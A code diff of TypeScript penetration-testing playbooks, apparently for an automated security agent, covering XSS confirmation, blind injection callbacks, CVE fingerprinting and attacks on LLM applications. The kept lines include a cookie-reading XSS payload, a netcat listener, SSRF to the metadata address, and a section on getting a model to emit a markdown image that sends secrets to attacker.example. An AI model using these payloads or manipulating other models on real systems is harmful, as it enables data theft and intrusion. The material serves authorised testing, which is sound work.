@@ -47,46 +47,6 @@ The injectable surface is a JSON KEY / field name concatenated into SQL (ORDER B
 - Try negative IDs, very large IDs, string values where integers expected
 - Check indirect IDOR: change ID in one endpoint, observe result in another`,
 
-  access_control: `## Broken Access Control Playbook (BOLA / IDOR / BFLA — multi-identity)
-
-This is the highest-impact API vuln class (OWASP API #1 & #5) and is ONLY
-testable with ≥2 identities. If the scan configured multiple identities, use
-the **access_control_probe** tool — it captures a resource as the authorized
-identity, replays the SAME request as another identity, and diffs the result.
-
-### Horizontal (BOLA / IDOR) — read another user's object
-1. As identity A, find an object you legitimately own: /api/users/{A_id},
-   /api/orders/{A_order}, /account/{A_id}/settings, ?id={A_id}.
-2. Call \`access_control_probe\` with that URL, baseline_identity = A,
-   compare_identities = [B], expect_denied = true.
-3. If B gets a 2xx with the SAME body A saw → confirmed BOLA. The tool returns
-   A-vs-B request/response evidence — pass it straight into save_finding.
-4. Also try B's own id incremented/decremented to A's id in the path AND body
-   (user_id, owner_id, account_id) — IDOR often hides in the POST/PUT body.
-
-### Vertical (BFLA) — low-priv reaching admin-only function
-1. As the admin identity, hit an admin-only endpoint (/admin, /api/admin/users,
-   role-changing POSTs).
-2. \`access_control_probe\` baseline_identity = admin, compare_identities =
-   [low-priv user, anonymous], expect_denied = true.
-3. A 2xx for the low-priv / anonymous identity = vertical privilege escalation.
-
-### Cross-tenant writes and multi-step workflows
-1. Use a disposable resource and a fresh marker within the approved scope.
-2. Call \`access_control_workflow\` with the owner and actor identities,
-   an owner-visible JSON observation, the actor's ordered requests, and
-   \`allow_mutation: true\`.
-3. Confirm only when the owner-visible state changes to the expected marker.
-   A 2xx/no-op is not proof, and a 403 can still hide a committed state change.
-4. Keep before/after and per-step evidence. Missing observations, transport
-   errors, or a marker already present before the attempt are inconclusive.
-
-### Tips
-- The HTTP tools are now stateful: a session cookie captured via submit_form is
-  auto-re-injected, so you do NOT need manual \`curl -c/-b\` jars.
-- A 200 alone isn't proof — the probe's body-similarity diff is what confirms
-  the SAME resource crossed the boundary. Save findings only on a real diff.`,
-
   xss: `## XSS Playbook
 
 ### Step 1: Identify Injection Points
@@ -101,13 +61,12 @@ identity, replays the SAME request as another identity, and diffs the result.
 - Stored XSS: inject in forms that save data (comments, profiles, settings), then visit the page where it renders
 - DOM XSS: look for document.location, innerHTML, eval, document.write in client JS source
 
-### Step 3: Confirm XSS with the Browser Tool (CRITICAL)
-curl CANNOT execute JavaScript — you MUST use the browser tool to confirm XSS fires.
-1. browser action=navigate url=TARGET_URL_WITH_PAYLOAD
-2. Check the "dialogs" array in the response — if it contains "alert: 1" or similar, XSS is CONFIRMED
-3. If no dialog fires, try: browser action=evaluate script="document.querySelector('img[onerror]') !== null"
-4. For stored XSS: first inject via curl/submit_form, then navigate with browser to the render page
-5. For DOM XSS: browser action=navigate to the page, then action=evaluate to check if payload executed
+### Step 3: Confirm That the XSS Executes (CRITICAL)
+curl CANNOT execute JavaScript. Confirm execution with a headless browser you start from bash when one is installed (for example a Playwright or Chromium one-liner that prints dialogs and the rendered DOM), or report the finding as unconfirmed reflection.
+1. Load TARGET_URL_WITH_PAYLOAD in the headless browser and capture any alert/confirm/prompt dialog
+2. If no dialog fires, check the rendered DOM for the injected element
+3. For stored XSS: first inject via curl, then load the render page in the headless browser
+4. For DOM XSS: load the page and check whether the payload executed
 
 ### Step 4: WAF/Filter Bypass Payloads
 If basic payloads are blocked, try these bypasses IN ORDER:
@@ -153,14 +112,12 @@ If basic payloads are blocked, try these bypasses IN ORDER:
 ### Step 5: JSFuck for Letter/Digit Filters (XBEN-010 vector)
 When the target's input filter strips letters or digits (alphanumerics) but still allows \`[]()!+\` through, payloads need to be encoded in JSFuck — a JavaScript-only-using-six-characters technique where every JS expression can be expressed using only \`[]()!+\`.
 - If the app, source, or response text shows an exact-output validator pattern like \`expected X\`, \`instead of X\`, or \`must alert X\`, optimize for that exact string immediately rather than generic execution.
-- Call \`payload_lookup\` with \`name="jsfuck_xss"\` when the challenge or checker expects the exact text \`XSS\`.
-- Call \`payload_lookup\` with \`name="jsfuck_alert"\` when any alert execution proof is enough.
 - If you get a near miss where execution happened but the dialog text was wrong, switch payload class on the next attempt instead of retrying the same primitive.
-- Do not try to hand-encode JSFuck under turn pressure; use the payload helper and focus on the escape context around it.
+- Generate the JSFuck encoding with a script from bash rather than hand-encoding it under turn pressure, and focus on the escape context around it.
 
 ### Step 6: Confirm and Save
-- Every XSS MUST be confirmed via the browser tool dialogs array before saving
-- Use save_finding with the exact payload, the URL, the parameter name, and the dialog output as evidence
+- Every XSS MUST be confirmed by observed execution (a headless-browser dialog or DOM proof) before saving
+- Use finding with the exact payload, the URL, the parameter name, and the dialog output as evidence
 - Include both the curl request that injects AND the browser confirmation`,
 
   ssrf: `## SSRF Playbook
@@ -317,7 +274,7 @@ nc -lvnp 9001 > /tmp/nc.log 2>&1 &
 2. Send injection payload with callback to listener
 3. Wait 2-5 seconds for response
 4. Read the listener log — if callback fired with expected data, exploit CONFIRMED
-5. save_finding with the payload, the callback evidence, and extracted data
+5. finding with the payload, the callback evidence, and extracted data
 
 ### Step 6: Combine Techniques
 If a single blind channel is unreliable:
@@ -333,7 +290,7 @@ the fastest path to impact is usually a public CVE rather than a novel bug. Fing
 then search for exploits, then execute the simplest working PoC.
 
 ### Step 1: Fingerprint Software and Versions
-- **If WordPress suspected, call the \`wp_fingerprint\` tool first** (available with --features wp_fingerprint). It returns a structured list of (plugin, version, cve_ids, exploit_hints), including local high-impact vulnerable-plugin catalog matches and proactive readme probes that you should iterate through before any manual fingerprinting.
+- If WordPress is suspected, enumerate plugins and themes from page source, /wp-json/ and readme.txt files, then match each (slug, version) against known CVEs.
 - Run manual low-noise probes first: whatweb -a 3 <target>, targeted curl requests to known version endpoints, and plain nmap -p only when port mapping is needed.
 - If the engagement explicitly permits generic scanner traffic and --allow-scanners is set: wpscan --url <target> --enumerate vp,vt,u (vulnerable plugins, themes, users). Do not use wpscan on scoped disclosure targets that ban automated scanners.
 - Pull version hints from:
@@ -678,7 +635,7 @@ The vulnerability is *downstream* of the model: the app renders or executes mode
 ### Step 2: Coax dangerous output
 - **Markdown image exfiltration (zero-click):** get the model to emit \`![x](https://attacker.example/log?d=SECRET)\`. A client that renders markdown silently GETs the URL, leaking whatever you smuggled into the query string (session data, prior message content).
 - **HTML/JS injection (XSS via the model):** make it output \`<img src=x onerror=alert(document.cookie)>\` or \`<script>...\`. If the UI renders unescaped → stored/reflected XSS.
-- **SSRF via output:** induce a link/markdown to \`http://169.254.169.254/...\` or \`http://localhost/...\` that a link-unfurler or browser tool will auto-fetch.
+- **SSRF via output:** induce a link/markdown to \`http://169.254.169.254/...\` or \`http://localhost/...\` that a link-unfurler or headless browser will auto-fetch.
 - **Code / SQL:** if output is eval'd or concatenated into a query, emit a payload that breaks out.
 
 ### Step 3: Confirm at the sink
@@ -757,7 +714,7 @@ Map each writable prompt-layer asset to its impact class:
 - Write the narrative: which row/column, which impact class(es), blast radius
   (all users / one tenant), persistence (survives restarts because it's in the DB),
   and the proof that it's writable + re-read.
-- \`save_finding\` with: the table/column/key, a read-only sample of the current
+- \`finding\` with: the table/column/key, a read-only sample of the current
   prompt, the privilege/re-read evidence, the impact classification, and the
   narrative. Explicitly note that NO destructive write was performed.`,
 
@@ -820,7 +777,7 @@ the fix is narrow and **adjacent objects are likely still unrooted**.
   heap-oob-*, …) and whether the offset / value is attacker-controllable.
 - A crash under the sanitizer is a *finding*; a full UAF→leak→arbitrary-read chain
   is NOT auto-synthesised — that stays human/agent-authored and gated by verify.
-- save_finding with: the unsafe block / GC-root gap, the minimal reproducing input,
+- finding with: the unsafe block / GC-root gap, the minimal reproducing input,
   the sanitizer/miri output, and the local build commit. Assume false-positive until
   the local instrumented build reproduces it deterministically.`,
 };
@@ -898,28 +855,6 @@ const INDICATORS: VulnIndicator[] = [
       /user_id/i,
       /owner_id/i,
       /account_id/i,
-    ],
-  },
-  {
-    // Multi-identity access-control surface (0#564). Distinct from `idor`:
-    // these patterns point at object/function references that should be tested
-    // with the access_control_probe tool across identities, plus the authz
-    // signals (admin endpoints, role params, allow/deny status codes).
-    type: "access_control",
-    patterns: [
-      /\/api\/[a-z]+\/\d+/i,
-      /\/api\/admin\//i,
-      /\/admin\b/i,
-      /\bobject[_-]?id\b/i,
-      /\bresource[_-]?id\b/i,
-      /\borg(?:anization)?[_-]?id\b/i,
-      /\btenant[_-]?id\b/i,
-      /\bis[_-]?admin\b/i,
-      /\brole\s*[=:]/i,
-      /\bunauthorized\b/i,
-      /\bforbidden\b/i,
-      /\b403\b/,
-      /\b401\b/,
     ],
   },
   {
@@ -1378,7 +1313,7 @@ export interface PromptLayerImpactResult {
   impacts: PromptLayerImpact[];
   /** coarse severity: high only when writable AND re-read at inference */
   severity: "info" | "low" | "high";
-  /** human-readable, save_finding-ready impact narrative */
+  /** human-readable, finding-ready impact narrative */
   narrative: string;
 }
 
